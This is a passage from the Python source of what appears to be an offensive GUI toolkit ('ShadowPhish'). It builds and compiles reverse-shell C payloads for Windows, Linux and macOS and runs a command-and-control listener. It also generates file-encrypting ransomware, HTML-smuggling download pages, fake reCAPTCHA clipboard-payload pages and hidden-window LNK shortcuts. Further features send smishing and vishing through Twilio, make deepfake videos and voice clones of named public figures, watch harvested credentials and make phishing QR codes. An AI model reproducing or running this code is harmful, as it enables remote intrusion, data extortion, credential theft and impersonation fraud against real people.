        self.timer.start(2000)  # every 2 seconds

    def check_credentials_file(self):
        if os.path.exists(self.cred_path):
            with open(self.cred_path, "r", encoding="utf-8") as f:
                content = f.read()
            if content != self.last_creds:
                self.creds_output.setPlainText(content)
                self.last_creds = content

    def generate_fake_recaptcha(self):
        import os
        import re
        import random
        import subprocess
        from PySide2.QtWidgets import QInputDialog, QMessageBox

        base_path = ".fake-recaptcha"
        js_path = os.path.join(base_path, "src", "fakerecaptcha.js")
        html_path = os.path.join(base_path, "index.html")

        if not os.path.exists(js_path) or not os.path.exists(html_path):
            QMessageBox.critical(self, "Error", "Files not found in the '.fake-recaptcha' folder.")
            return

        # Get payload from user input
        payload, ok = QInputDialog.getMultiLineText(self, "Payload", "Enter the payload to be copied:")
        if not ok or not payload.strip():
            return
        payload = payload.strip().replace('"', '\\"')

        # OS selection
        systems = ["Windows", "Linux", "macOS"]
        system, ok = QInputDialog.getItem(self, "Target System", "Select the target system:", systems, editable=False)
        if not ok or not system:
            return

        try:
            # Replace payload in JavaScript
            with open(js_path, "r", encoding="utf-8") as f:
                js_content = f.read()

            new_js = re.sub(r'const payload\s*=\s*`.*?`;', f'const payload = `{payload}`;', js_content, flags=re.DOTALL)

            with open(js_path, "w", encoding="utf-8") as f:
                f.write(new_js)

        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to modify JS:\n{str(e)}")
            return

        try:
            # Modify index.html to store selected OS in localStorage
            with open(html_path, "r", encoding="utf-8") as f:
                html = f.read()

            if "localStorage.setItem" not in html:
                html = html.replace(
                    '<script src="src/fakerecaptcha.js"></script>',
                    f'<script>localStorage.setItem("os", "{system.lower()}");</script>\n<script src="src/fakerecaptcha.js"></script>'
                )
            else:
                html = re.sub(r'localStorage\.setItem\("os", "[^"]*"\);',
                              f'localStorage.setItem("os", "{system.lower()}");', html)

            with open(html_path, "w", encoding="utf-8") as f:
                f.write(html)

        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to modify HTML:\n{str(e)}")
            return

        # Start PHP server
        try:
            port = random.randint(8100, 8999)
            subprocess.Popen(
                ["php", "-S", f"0.0.0.0:{port}"],
                cwd=base_path,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            url = f"http://127.0.0.1:{port}/"
            QMessageBox.information(self, "Fake Recaptcha", f"Server started at:\n{url}")
            self.phish_url_label.setText(f"<b>Fake Recaptcha</b> <a href='{url}'>{url}</a>")
            self.phish_url_label.setOpenExternalLinks(True)

        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to start PHP server:\n{str(e)}")

    def generate_deepvoice_audio(self):
        import asyncio  
        import threading

        text = self.voice_input.toPlainText().strip()
        voice = self.voice_selector.currentText()

        voice_map = {
            "Obama": "en-US-GuyNeural",
            "Elon Musk": "en-US-AriaNeural",
            "Generic": "en-US-JennyNeural",
            "Trained": "en-GB-RyanNeural"
        }
        selected_voice = voice_map.get(voice, "en-US-GuyNeural")

        if not text:
            QMessageBox.warning(self, "Warning", "Please enter text to generate voice.")
            return

        def run_voice():
            asyncio.run(generate_cloned_voice(text, selected_voice))
            self.deepvoice_status.setText("✅ Voice generated successfully: cloned_voice.mp3")

        threading.Thread(target=run_voice).start()


    def select_face_image(self):
        from PySide2.QtWidgets import QFileDialog
        path, _ = QFileDialog.getOpenFileName(self, "Select Face Image", "", "Images (*.jpg *.jpeg *.png)")
        if path:
            self.face_image_path = path
            QMessageBox.information(self, "Image Selected", f"Face image loaded:\n{path}")

    def select_target_video(self):
        from PySide2.QtWidgets import QFileDialog
        path, _ = QFileDialog.getOpenFileName(self, "Select Target Video", "", "Videos (*.mp4 *.avi *.mov)")
        if path:
            self.target_video_path = path
            QMessageBox.information(self, "Video Selected", f"Target video loaded:\n{path}")

    def run_deepfake_generator(self):
        import subprocess
        import threading

        if not self.face_image_path or not self.target_video_path:
            QMessageBox.warning(self, "Error", "Please select both a face image and a target video.")
            return

        def execute():
            try:
                output_path = "deepfake_output.mp4"
                command = [
                    "facefusion",
                    "--source", self.face_image_path,
                    "--target", self.target_video_path,
                    "--output", output_path,
                    "--skip-download"  # if models are already downloaded
                ]
                result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

                if result.returncode == 0:
                    self.deepfake_status.setText(f"✅ Deepfake successfully generated: {output_path}")
                else:
                    self.deepfake_status.setText(f"❌ Error generating deepfake:\n{result.stderr}")

            except Exception as e:
                self.deepfake_status.setText(f"Unexpected error: {str(e)}")

        threading.Thread(target=execute, daemon=True).start()

    def generate_c2_payload(self):
        ip = self.c2_ip_input.text().strip()
        port = self.c2_port_input.text().strip()
        target_os = self.c2_os_selector.currentText()

        if not ip or not port:
            QMessageBox.warning(self, "Error", "Please enter both IP and Port.")
            return

        try:
            os.makedirs("payloads", exist_ok=True)

            if target_os == "Windows":
                filename = "payloads/payload_windows.c"
                exe_name = "payloads/payload_windows.exe"
                payload_code = f'''
#include <winsock2.h>
#include <windows.h>
#pragma comment(lib, "ws2_32")

WSADATA wsa;
SOCKET sock;
struct sockaddr_in server;

int main() {{
    WSAStartup(MAKEWORD(2,2), &wsa);
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons({port});
    server.sin_addr.s_addr = inet_addr("{ip}");
    connect(sock, (struct sockaddr*)&server, sizeof(server));
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    return 0;
}}'''
                with open(filename, "w") as f:
                    f.write(payload_code)
                compile_cmd = f"x86_64-w64-mingw32-gcc {filename} -o {exe_name} -lws2_32"

            elif target_os == "Linux":
                filename = "payloads/payload_linux.c"
                exe_name = "payloads/payload_linux"
                payload_code = f'''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/socket.h>

int main() {{
    int sock;
    struct sockaddr_in attacker;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    attacker.sin_family = AF_INET;
    attacker.sin_port = htons({port});
    attacker.sin_addr.s_addr = inet_addr("{ip}");

    connect(sock, (struct sockaddr *)&attacker, sizeof(attacker));

    dup2(sock, 0); // STDIN
    dup2(sock, 1); // STDOUT
    dup2(sock, 2); // STDERR

    execl("/bin/sh", "sh", NULL);
    return 0;
}}'''
                with open(filename, "w") as f:
                    f.write(payload_code)
                compile_cmd = f"gcc {filename} -o {exe_name}"

            elif target_os == "macOS":
                filename = "payloads/payload_macos.c"
                exe_name = "payloads/payload_macos"
                payload_code = f'''
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <sys/socket.h>

int main() {{
    int sock;
    struct sockaddr_in attacker;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    attacker.sin_family = AF_INET;
    attacker.sin_port = htons({port});
    attacker.sin_addr.s_addr = inet_addr("{ip}");

    connect(sock, (struct sockaddr *)&attacker, sizeof(attacker));

    dup2(sock, 0); // STDIN
    dup2(sock, 1); // STDOUT
    dup2(sock, 2); // STDERR

    execl("/bin/zsh", "zsh", NULL);
    return 0;
}}'''
                with open(filename, "w") as f:
                    f.write(payload_code)
                compile_cmd = f"clang {filename} -o {exe_name}"

            # Compilation
            result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                QMessageBox.information(self, "Success", "Payload compiled successfully.")
                
                # ✅ Update default commands for the selected platform
                selected_platform = self.c2_platform_selector.currentText()
                self.update_default_commands(selected_platform)
                
                # ✅ Start the listener
                self.start_listener(ip, int(port))
            else:
                QMessageBox.critical(self, "Error", f"Compilation error:\n{result.stderr}")

        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to generate payload:\n{str(e)}")


    def start_listener(self, ip, port):
        def listener():
            self.listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.listener_socket.bind((ip, port))
            self.listener_socket.listen(1)
            self.c2_terminal.append("[+] Waiting for connection...")
            self.client_socket, addr = self.listener_socket.accept()
            self.c2_terminal.append(f"[+] Connected to: {addr}\n")
            while True:
                try:
                    output = self.client_socket.recv(4096).decode(errors='ignore')
                    if output:
                        self.c2_terminal.append(output)
                except:
                    break

        threading.Thread(target=listener, daemon=True).start()

    def send_c2_command(self, command):
        if self.client_socket:
            try:
                self.client_socket.sendall((command + "\n").encode())
                self.manual_cmd.clear()
            except Exception as e:
                self.c2_terminal.append(f"[Error sending command]: {str(e)}")
        else:
            self.c2_terminal.append("[!] No client connected yet.")

    def update_default_commands(self, platform):
        # Remove old buttons
        for btn in self.cmd_buttons:
            btn.deleteLater()
        self.cmd_buttons.clear()

        if platform == "Windows":
            commands = ["whoami", "ipconfig", "dir", "tasklist", "powershell"]
        elif platform == "Linux":
            commands = ["whoami", "ifconfig", "ls", "ps aux", "uname -a"]
        elif platform == "macOS":
            commands = ["whoami", "ifconfig", "ls", "ps -ax", "sw_vers"]

        for cmd in commands:
            btn = QPushButton(f"Run: {cmd}")
            btn.clicked.connect(lambda checked=False, c=cmd: self.send_c2_command(c))
            self.cmds_layout.addWidget(btn)
            self.cmd_buttons.append(btn)

    def select_audio_file(self):
        from PySide2.QtWidgets import QFileDialog
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Audio File", "", "Audio Files (*.mp3 *.wav)")
        if file_path:
            self.gsm_audio_path.setText(file_path)

    def send_gsm_action(self):
        from twilio.rest import Client
        import os

        sid = self.twilio_sid_input.text().strip()
        token = self.twilio_token_input.text().strip()
        from_number = self.twilio_from_input.text().strip()
        to_number = self.gsm_number_input.text().strip()
        action_type = self.gsm_type_selector.currentText()
        message = self.gsm_msg_input.toPlainText().strip()
        audio_url = self.gsm_audio_path.text().strip()

        if not sid or not token or not from_number:
            QMessageBox.warning(self, "Error", "Please fill in Twilio credentials (SID, Token, and From Number).")
            return

        if not to_number:
            QMessageBox.warning(self, "Error", "Please enter the destination phone number.")
            return

        try:
            client = Client(sid, token)

            if "Smishing" in action_type:
                if not message:
                    QMessageBox.warning(self, "Error", "Please enter the SMS message.")
                    return

                msg_response = client.messages.create(
                    body=message,
                    from_=from_number,
                    to=to_number
                )
                self.gsm_status.setText(f"✅ SMS successfully sent! SID: {msg_response.sid}")

            elif "Vishing" in action_type:
                if audio_url.startswith("http"):
                    call = client.calls.create(
                        twiml=f'<Response><Play>{audio_url}</Play></Response>',
                        from_=from_number,
                        to=to_number
                    )
                    self.gsm_status.setText(f"📞 Call successfully started! SID: {call.sid}")
                else:
                    QMessageBox.warning(
                        self,
                        "Error",
                        "Please provide a valid audio URL for the call (e.g., https://.../audio.mp3)"
                    )
                    return

        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to send:\n{str(e)}")


    def generate_apt_chain(self):
        apt = self.apt_selector.currentText()
        chains = {
            "APT29": [
                "Spear Phishing Attachment (T1566.001)",
                "Malicious DOC with Macro",
                "PowerShell Downloader",
                "Command & Control Channel (HTTPS)",
                "Credential Dumping (T1003)"
            ],
            "FIN7": [
                "Spear Phishing Link (T1566.002)",
                "HTA Dropper Executed via wscript",
                "C2 with Empire Framework",
                "Credential Access using mimikatz",
                "Persistence via Registry Run Key"
            ],
            "APT41": [
                "Phishing with PDF",
                "DLL Sideloading",
                "Cobalt Strike Beacon",
                "Lateral Movement via RDP",
                "Exfiltration via Cloud API"
            ]
        }

        template = chains.get(apt, [])
        if template:
            self.apt_output.setPlainText(" → ".join(template))
            self.apt_status.setText(f"✅ Attack chain for {apt} generated.")
        else:
            self.apt_output.clear()
            self.apt_status.setText("❌ Error: Unrecognized APT.")

    def generate_lnk_malware(self):
        import pythoncom
        from win32com.client import Dispatch

        target = self.lnk_payload_input.text().strip()
        name = self.lnk_name_input.text().strip()
        icon = self.lnk_icon_input.text().strip()
        output = self.lnk_output_dir.text().strip()
        hidden = self.lnk_hidden_checkbox.isChecked()

        if not all([target, name, output]):
            QMessageBox.warning(self, "Error", "Please fill in all required fields.")
            return

        try:
            shortcut = Dispatch("WScript.Shell").CreateShortcut(os.path.join(output, name))
            shortcut.TargetPath = target
            shortcut.WorkingDirectory = os.path.dirname(target)

            if icon:
                shortcut.IconLocation = icon

            if hidden:
                shortcut.WindowStyle = 7  # Minimized (invisible)

            shortcut.Save()
            self.lnk_status.setText(f"✅ Shortcut created at: {os.path.join(output, name)}")
        except Exception as e:
            self.lnk_status.setText(f"❌ Error: {str(e)}")

    def select_icon_file(self):
        from PySide2.QtWidgets import QFileDialog
        file_path, _ = QFileDialog.getOpenFileName(self, "Select Icon File", "", "Icons (*.ico)")
        if file_path:
            self.lnk_icon_input.setText(file_path)

    def select_output_folder(self):
        from PySide2.QtWidgets import QFileDialog
        folder_path = QFileDialog.getExistingDirectory(self, "Select Output Folder")
        if folder_path:
            self.lnk_output_dir.setText(folder_path)

    def select_htmlsm_file(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select File for HTML Smuggling", "", "All Files (*)")
        if path:
            self.htmlsm_file_input.setText(path)

    def generate_htmlsm(self):
        import base64
        import os

        file_path = self.htmlsm_file_input.text().strip()
        image_url = self.htmlsm_image_url.text().strip() or "https://i.natgeofe.com/n/548467d8-c5f1-4551-9f58-6817a8d2c45e/NationalGeographic_2572187_square.jpg"
        download_name = self.htmlsm_output_filename.text().strip()
        mode = self.htmlsm_mode_selector.currentText()

        if not os.path.exists(file_path):
            QMessageBox.warning(self, "Error", "Selected file not found.")
            return

        try:
            with open(file_path, "rb") as f:
                b64_data = base64.b64encode(f.read()).decode()

            if mode == "Click the Image":
                html_template = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Click to Download</title>
    <style>
        body {{ font-family: Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }}
        .container {{ text-align: center; }}
        img {{ width: 200px; cursor: pointer; }}
    </style>
</head>
<body>
<div class="container">
    <h3>Click on the Image!</h3>
    <img src="{image_url}" alt="Click to download" onclick="initiateDownload()" />
</div>
<script>
(function() {{
    function b64ToBuf(b64) {{
        var bin = atob(b64), len = bin.length, buf = new Uint8Array(len);
        for (var i = 0; i < len; i++) buf[i] = bin.charCodeAt(i);
        return buf;
    }}
    window.initiateDownload = function() {{
        var data = `{b64_data}`;
        var blobData = b64ToBuf(data);
        var blob = new Blob([blobData], {{ type: 'application/octet-stream' }});
        var link = document.createElement('a');
        link.style.display = 'none';
        document.body.appendChild(link);
        var url = window.URL.createObjectURL(blob);
        link.href = url;
        link.download = '{download_name}';
        link.click();
        setTimeout(function() {{
            window.URL.revokeObjectURL(url);
            document.body.removeChild(link);
        }}, 100);
    }};
}})();
</script>
</body>
</html>"""
            else:  # Automatic Download
                html_template = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Download Starting...</title>
    <script>
    (function() {{
        function b64ToBuf(b64) {{
            var bin = atob(b64), len = bin.length, buf = new Uint8Array(len);
            for (var i = 0; i < len; i++) buf[i] = bin.charCodeAt(i);
            return buf;
        }}
        window.onload = function() {{
            var data = `{b64_data}`;
            var blobData = b64ToBuf(data);
            var blob = new Blob([blobData], {{ type: 'application/octet-stream' }});
            var link = document.createElement('a');
            link.style.display = 'none';
            document.body.appendChild(link);
            var url = window.URL.createObjectURL(blob);
            link.href = url;
            link.download = '{download_name}';
            link.click();
            setTimeout(function() {{
                window.URL.revokeObjectURL(url);
                document.body.removeChild(link);
            }}, 100);
        }};
    }})();
    </script>
</head>
<body>
<h3>Download Starting...</h3>
</body>
</html>"""

            os.makedirs("outputs", exist_ok=True)
            html_path = os.path.join("outputs", "html_smuggling.html")
            with open(html_path, "w", encoding="utf-8") as f:
                f.write(html_template)

            self.htmlsm_status.setText(f"✅ HTML Smuggling file generated at: {html_path}")
            QMessageBox.information(self, "Success", f"HTML saved as:\n{html_path}")
            self.htmlsm_open_btn.setEnabled(True)
            self.generated_html_path = html_path

        except Exception as e:
            self.htmlsm_status.setText(f"❌ Error: {str(e)}")
            QMessageBox.critical(self, "Error", f"Failed to generate HTML:\n{str(e)}")

    def open_htmlsm_in_browser(self):
        import webbrowser
        import os

        if hasattr(self, "generated_html_path") and os.path.exists(self.generated_html_path):
            try:
                webbrowser.open_new_tab(f"file://{os.path.abspath(self.generated_html_path)}")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to open in browser:\n{str(e)}")
        else:
            QMessageBox.warning(self, "Error", "HTML file not found to open.")


    def generate_sim_ransomware(self):
        import os
        import subprocess
        from PySide2.QtWidgets import QMessageBox

        name = self.ransomware_name_input.text().strip() or "SimRansom"
        key_text = self.ransomware_key_input.text().strip()
        cipher_type = self.ransomware_cipher_selector.currentText()
        target_os = self.ransomware_os_selector.currentText()  # "Linux" or "Windows"

        if not key_text:
            QMessageBox.warning(self, "Error", "Please enter a key (e.g., TopSecret123).")
            return

        key = key_text.encode("utf-8")
        key_len = len(key)
        key_array = ', '.join(str(b) for b in key)

        os.makedirs("sim_ransomware", exist_ok=True)

        encryptor_path = f"sim_ransomware/{name}_encryptor_{target_os.lower()}.c"
        decryptor_path = f"sim_ransomware/{name}_decryptor_{target_os.lower()}.c"
        exe_ext = ".exe" if target_os == "Windows" else ""
        exe_path = f"sim_ransomware/{name}_{target_os.lower()}{exe_ext}"

        # Path separator
        path_sep = "\\" if target_os == "Windows" else "/"

        # Cipher selection
        if cipher_type == "RC4":
            cipher_func = f"""
void rc4(unsigned char* data, int len, unsigned char* key, int klen) {{
    unsigned char S[256];
    for (int i = 0; i < 256; i++) S[i] = i;

    int j = 0;
    for (int i = 0; i < 256; i++) {{
        j = (j + S[i] + key[i % klen]) % 256;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
    }}

    int i = 0; j = 0;
    for (int n = 0; n < len; n++) {{
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
        data[n] ^= S[(S[i] + S[j]) % 256];
    }}
}}
"""
            crypto_call = "rc4(buffer, len, key, key_len);"

        else:  # XOR
            cipher_func = f"""
void xor_cipher(unsigned char* data, int len, unsigned char* key, int klen) {{
    for (int i = 0; i < len; i++) {{
        data[i] ^= key[i % klen];
    }}
}}
"""
            crypto_call = "xor_cipher(buffer, len, key, key_len);"

        # Base ransomware logic
        base_code = f'''#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>

unsigned char key[] = {{{key_array}}};
int key_len = {key_len};

{cipher_func}

void process_file(const char* filepath) {{
    FILE* f = fopen(filepath, "rb");
    if (!f) return;
    fseek(f, 0, SEEK_END);
    long len = ftell(f);
    rewind(f);

    unsigned char* buffer = malloc(len);
    fread(buffer, 1, len, f);
    fclose(f);

    {crypto_call}

    FILE* out = fopen(filepath, "wb");
    fwrite(buffer, 1, len, out);
    fclose(out);
    free(buffer);
}}

void walk(const char* path) {{
    struct dirent* entry;
    DIR* dp = opendir(path);
    if (!dp) return;

    while ((entry = readdir(dp))) {{
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
        char fullpath[1024];
        snprintf(fullpath, sizeof(fullpath), "%s{path_sep}%s", path, entry->d_name);

        struct stat st;
        if (stat(fullpath, &st) == 0 && S_ISDIR(st.st_mode)) {{
            walk(fullpath);
        }} else {{
            process_file(fullpath);
        }}
    }}
    closedir(dp);
}}

int main(int argc, char* argv[]) {{
    if (argc != 2) {{
        printf("Usage: %s <folder>\\n", argv[0]);
        return 1;
    }}
    walk(argv[1]);
    return 0;
}}'''

        # Save the encryptor source code
        with open(encryptor_path, "w") as f:
            f.write(base_code)

        # Save the decryptor (same logic, just labeled differently)
        with open(decryptor_path, "w") as f:
            f.write(f"// DECRYPTOR {name} - Platform: {target_os} - Key: {key_text}\n")
            f.write(base_code)

        # Compilation
        compiler = "x86_64-w64-mingw32-gcc" if target_os == "Windows" else "gcc"
        compile_cmd = f"{compiler} {encryptor_path} -o {exe_path}"

        try:
            result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                QMessageBox.information(self, "Success", f"✅ {target_os} ransomware generated successfully at:\n{exe_path}")
            else:
                QMessageBox.warning(self, "Warning", f"⚠️ Source code generated, but compilation failed:\n{result.stderr}")
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Compilation error: {str(e)}")


    def generate_sim_decryptor(self):
        import os
        import subprocess
        from PySide2.QtWidgets import QMessageBox

        name = self.decryptor_name_input.text().strip() or "SimRansom"
        key_text = self.decryptor_key_input.text().strip()
        cipher_type = self.decryptor_cipher_selector.currentText()
        os_target = self.decryptor_os_selector.currentText()  # "Windows" or "Linux"

        if not key_text:
            QMessageBox.warning(self, "Error", "Please enter the key used in the ransomware (plain text).")
            return

        key = key_text.encode("utf-8")
        key_len = len(key)
        key_array = ', '.join(str(b) for b in key)

        os.makedirs("sim_ransomware", exist_ok=True)
        decryptor_path = f"sim_ransomware/{name}_decryptor_{os_target.lower()}.c"
        exe_path = f"sim_ransomware/{name}_decryptor_{os_target.lower()}.exe" if os_target == "Windows" else f"sim_ransomware/{name}_decryptor_{os_target.lower()}"

        sep = "\\" if os_target == "Windows" else "/"

        # Cipher logic
        if cipher_type == "RC4":
            cipher_func = f"""
void rc4(unsigned char* data, int len, unsigned char* key, int klen) {{
    unsigned char S[256];
    for (int i = 0; i < 256; i++) S[i] = i;

    int j = 0;
    for (int i = 0; i < 256; i++) {{
        j = (j + S[i] + key[i % klen]) % 256;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
    }}

    int i = 0; j = 0;
    for (int n = 0; n < len; n++) {{
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
        data[n] ^= S[(S[i] + S[j]) % 256];
    }}
}}
"""
            crypto_call = "rc4(buffer, len, key, key_len);"
        else:  # XOR
            cipher_func = f"""
void xor_cipher(unsigned char* data, int len, unsigned char* key, int klen) {{
    for (int i = 0; i < len; i++) {{
        data[i] ^= key[i % klen];
    }}
}}
"""
            crypto_call = "xor_cipher(buffer, len, key, key_len);"

        # Full C code template
        code = f'''#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>

unsigned char key[] = {{{key_array}}};
int key_len = {key_len};

{cipher_func}

void process_file(const char* filepath) {{
    FILE* f = fopen(filepath, "rb");
    if (!f) return;
    fseek(f, 0, SEEK_END);
    long len = ftell(f);
    rewind(f);

    unsigned char* buffer = malloc(len);
    fread(buffer, 1, len, f);
    fclose(f);

    {crypto_call}

    FILE* out = fopen(filepath, "wb");
    fwrite(buffer, 1, len, out);
    fclose(out);
    free(buffer);
}}

void walk(const char* path) {{
    struct dirent* entry;
    DIR* dp = opendir(path);
    if (!dp) return;

    while ((entry = readdir(dp))) {{
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
        char fullpath[1024];
        snprintf(fullpath, sizeof(fullpath), "%s{sep}%s", path, entry->d_name);

        struct stat st;
        if (stat(fullpath, &st) == 0 && S_ISDIR(st.st_mode)) {{
            walk(fullpath);
        }} else {{
            process_file(fullpath);
        }}
    }}
    closedir(dp);
}}

int main(int argc, char* argv[]) {{
    if (argc != 2) {{
        printf("Usage: %s <folder>\\n", argv[0]);
        return 1;
    }}
    walk(argv[1]);
    return 0;
}}'''

        # Save C code to file
        with open(decryptor_path, "w") as f:
            f.write(code)

        compiler = "x86_64-w64-mingw32-gcc" if os_target == "Windows" else "gcc"
        compile_cmd = f"{compiler} {decryptor_path} -o {exe_path}"

        try:
            result = subprocess.run(compile_cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                QMessageBox.information(self, "Success", f"✅ Decryptor for {os_target} generated: {exe_path}")
            else:
                QMessageBox.warning(self, "Warning", f"⚠️ Source code created, but failed to compile:\n{result.stderr}")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Compilation error: {str(e)}")

    def generate_phishing_qrcode(self):
        import qrcode
        from PySide2.QtGui import QImage, QPixmap
        from io import BytesIO

        url = self.qr_url_input.text().strip()
        if not url:
            QMessageBox.warning(self, "Error", "Please enter the target URL.")
            return

        try:
            qr = qrcode.QRCode(
                version=1,
                error_correction=qrcode.constants.ERROR_CORRECT_L,
                box_size=8,
                border=4,
            )
            qr.add_data(url)
            qr.make(fit=True)

            img = qr.make_image(fill_color="black", back_color="white").convert("RGB")
            buffer = BytesIO()
            img.save(buffer, format="PNG")
            qt_img = QImage.fromData(buffer.getvalue())
            pixmap = QPixmap.fromImage(qt_img)

            self.qr_img_data = img  # Store PIL image for later saving
            self.qr_image_label.setPixmap(pixmap)
            self.qr_save_btn.setEnabled(True)

        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to generate QR Code:\n{str(e)}")

    def save_qrcode_image(self):
        if hasattr(self, "qr_img_data"):
            from PySide2.QtWidgets import QFileDialog
            path, _ = QFileDialog.getSaveFileName(self, "Save QR Code", "phish_qrcode.png", "PNG (*.png)")
            if path:
                try:
                    self.qr_img_data.save(path)
                    QMessageBox.information(self, "Saved", f"QR Code successfully saved to:\n{path}")
                except Exception as e:
                    QMessageBox.critical(self, "Error", f"Failed to save QR Code:\n{str(e)}")
        else:
            QMessageBox.warning(self, "Error", "No QR Code has been generated yet.")

    def tr(self, key):
        return self.translations.get(key, key)

import asyncio
import edge_tts

async def generate_cloned_voice(text, voice="en-US-GuyNeural", output_file="outputs/cloned_voice.mp3"):
    communicate = edge_tts.Communicate(text, voice)
    await communicate.save(output_file)
    return output_file

if __name__ == "__main__":
    app = QApplication(sys.argv)

    splash = ShadowPhishSplash()
    splash.show()

    def start_main():
        window = DarkThemeApp()
        window.show()
        splash.finish(window)

    QTimer.singleShot(2500, start_main)

    sys.exit(app.exec_())
